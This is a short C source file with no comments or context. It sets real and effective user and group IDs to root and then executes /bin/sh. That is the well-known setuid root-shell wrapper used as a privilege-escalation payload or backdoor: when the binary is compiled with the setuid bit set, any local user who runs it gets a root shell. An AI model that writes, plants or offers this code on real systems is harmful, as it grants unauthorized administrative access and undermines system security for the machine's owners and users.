#include <stdio.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
	setreuid(0,0);
	setregid(0,0);
	execv("/bin/sh", argv);
}
